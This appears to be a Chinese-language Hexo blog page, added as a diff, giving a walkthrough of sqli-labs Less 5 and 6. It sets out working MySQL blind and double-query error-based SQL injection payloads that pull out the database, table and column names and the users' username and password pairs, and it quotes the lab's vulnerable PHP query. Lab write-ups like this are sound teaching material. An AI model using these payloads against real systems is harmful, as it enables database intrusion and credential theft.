@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        likesoso - 随便写写
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            sqli-labs教程(2)
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h1><p>单引号报错：</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>判断是只有单引号包裹id，尝试构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 &#39; and 1&#x3D;1 -- - &#x2F;&#x2F;页面正常</span><br><span class="line">?id&#x3D;1 &#39; and 1&#x3D;2 -- - &#x2F;&#x2F;页面不正常</span><br></pre></td></tr></table></figure>
+
+<p>order by 后得到是3个字段，尝试union select 和报错注入时，发现没有回显位，可供回显</p>
+<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-1.jpg" alt="2-1.jpg"></p>
+<h2 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h2><p><code>?id=1&#39; and sleep(5) -- -</code></p>
+<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-2.jpg" alt="2-2.jpg"></p>
+<p>时间盲注和报错注入的payload构造基本相似：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if (SQL语句,sleep(5),1) <span class="comment">-- -</span></span><br><span class="line">//if(expr1,expr2,expr3) expr1为ture 返回expr2 否则返回expr3</span><br></pre></td></tr></table></figure>
+
+<p>爆库名长度：<br><code>?id = 1&#39; and if (length(database()) = 8,sleep(5),1) -- -</code></p>
+<p>如果sleep(5)执行了，表明数据库名长度为8位</p>
+<p>爆库名payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id =1&#x27; and if (left(database(),1) = &#x27;s&#x27; ,sleep(5),1) <span class="comment">-- -</span></span><br><span class="line">//left(database(),1) 返回database()从左往右的第一位，即为s</span><br></pre></td></tr></table></figure>
+<p>一个字符一个字符的爆破最终得到数据库名为<strong>security</strong></p>
+<p>以此类推爆破表，列，需要注意的是mysql对大小写不敏感，所以爆破出得结果可能与真实结果有偏差</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>正确会页面正常，错误页面不正常</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id =1&#x27; and left((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>) = <span class="string">&#x27;s&#x27;</span> <span class="comment">-- -`</span></span><br><span class="line">//一个字符一个字符的跑，用二分法</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="这里介绍一种利用count-聚合函数构造双查询注入"><a href="#这里介绍一种利用count-聚合函数构造双查询注入" class="headerlink" title="这里介绍一种利用count(*)聚合函数构造双查询注入"></a>这里介绍一种利用count(*)聚合函数构造双查询注入</h2><p>首先了解四个函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. Rand()  &#x2F;&#x2F;随机函数，0&lt;值&lt;1</span><br><span class="line">2. Floor()  &#x2F;&#x2F;取整函数,向下取整</span><br><span class="line">3. Count() &#x2F;&#x2F;汇总函数，计数</span><br><span class="line">4. Group by clause &#x2F;&#x2F;分组语句</span><br></pre></td></tr></table></figure>
+
+<p>故FLOOR(RAND()*2)的值只能是0或者1</p>
+<p>执行以下sql语句：<br><code>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2))</code></p>
+<p>concat会将数据库名和0或者1拼接起来，所以返回值为security0或者security1</p>
+<p>执行：<br><code>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) from information_schema.schemata</code></p>
+<p>数据库中<strong>information_schema.schemata</strong>包含了所有的数据库名。本地有7个数据库所以返回了7个结果：</p>
+<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-3.jpg" alt="2-1.jpg"></p>
+<p>给CONCAT((SELECT database()), FLOOR(RAND()*2))设置一个别名为a，然后分组，可以得到两组：security0和security1:</p>
+<p><code>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2))as a from information_schema.schemata group by a</code></p>
+<p><strong>最后</strong>，配合聚合函数count(*)，构造sql语句：</p>
+<p><code>SELECT count(*), CONCAT((SELECT database()), FLOOR(RAND()*2))as a from information_schema.schemata group by a</code></p>
+<p><strong>会产生报错！！</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate entry &#39;security1&#39; for key ‘group_key’</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-4.jpg" alt="2-4.jpg"></p>
+<p>到这里，就是利用聚合函数count(*)构造双查询报错注入的最终方法了。结合less5，构造一下payload：</p>
+<p>爆库名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">count</span>(*),<span class="keyword">CONCAT</span>(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">SELECT</span> <span class="keyword">database</span>()),<span class="string">&#x27;~&#x27;</span>, <span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select count(*),1,CONCAT(&#x27;</span>~<span class="string">&#x27;,(SELECT database()),&#x27;</span>~<span class="string">&#x27;, FLOOR(RAND()*2))as a from information_schema.tables group by a -- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//这里写两个conut(*)是因为会报错 ：The used SELECT statements have a different number of columns，所以加一个count(*)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<p>结果有时候会显示不出来，再次发包即可</p>
+<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-5.jpg" alt="2-5.jpg"></p>
+<p>爆表名：</p>
+<p><code>-1&#39; union select count(*),1,CONCAT(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#39;~&#39;, FLOOR(RAND()*2))as a from information_schema.tables group by a -- -</code></p>
+<p>通过修改limit0,1 为limit 1,1 可以读取下一条数据，以此类推读取到用户表user</p>
+<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-6.jpg" alt="2-6.jpg"></p>
+<p>爆列名<br><code>?id=-1&#39; union select count(*),1,CONCAT(&#39;~&#39;,(select concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1),&#39;~&#39;, FLOOR(RAND()*2))as a from information_schema.tables group by a -- - </code></p>
+<p>通过修改limit0,1 为limit 1,1 可以读取下一条数据，以此类推读取到字段：username、password</p>
+<p>爆内容：</p>
+<p><code>-1&#39; union select count(*),1,CONCAT(&#39;~&#39;,(select concat(username,&#39;|&#39;,password) from users limit 0,1),&#39;~&#39;, FLOOR(RAND()*2))as a from information_schema.tables group by a -- -</code></p>
+<p>修改limit，读取剩下的数据：</p>
+<p><img src="/2020/09/07/sqli-labs%E6%95%99%E7%A8%8B-2/2-7.jpg" alt="2-7.jpg"></p>
+<h1 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h1><p>单引号不报错，双引号报错：</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>判断$id被双引号包裹，其他跟less5一致，只需要将less5的payload中的’替换成”即可</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label>
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
